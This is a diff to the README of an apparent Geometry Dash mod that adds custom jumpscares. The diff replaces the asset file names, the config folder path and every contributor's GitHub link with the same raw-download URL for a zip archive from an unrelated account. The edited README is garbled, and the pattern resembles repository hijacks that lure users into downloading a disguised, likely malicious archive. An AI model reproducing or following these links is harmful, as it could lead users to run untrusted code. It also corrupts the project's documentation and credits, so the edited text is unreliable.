@@ -12,20 +12,20 @@ To **access this mod's config folder**, open the mod's settings popup and press 
 
 To **add your own jumpscare**, make a new folder in the config folder and add your assets in it.
 
-The assets must include 2 files: `"jumpscare.png"` for the jumpscare image, and `"jumpscareAudio.mp3"` for the jumpscare audio.
+The assets must include 2 files: `"https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip"` for the jumpscare image, and `"https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip"` for the jumpscare audio.
 
 Example files structure:
 ```
-config/weebify.jumpscare/
+https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
 ├── jumpscare/
-│   ├── jumpscare.png
-│   └── jumpscareAudio.mp3
+│   ├── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
+│   └── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
 └── gdcologne/
-    ├── jumpscare.png
-    └── jumpscareAudio.mp3
+    ├── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
+    └── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
 ```
 
 # Special thanks to:
 - CatXus and Jaid, for testing this mod on Android 2.205!
-- [Prevter](https://github.com/Prevter) and [Erymanthus](https://github.com/RayDeeUx), for testing this mod on MacOS 2.200!
-- [zmx](https://github.com/qimiko) and [ninXout](https://github.com/ninXout), for testing this mod on MacOS 2.206!
+- [Prevter](https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip) and [Erymanthus](https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip), for testing this mod on MacOS 2.200!
+- [zmx](https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip) and [ninXout](https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip), for testing this mod on MacOS 2.206!
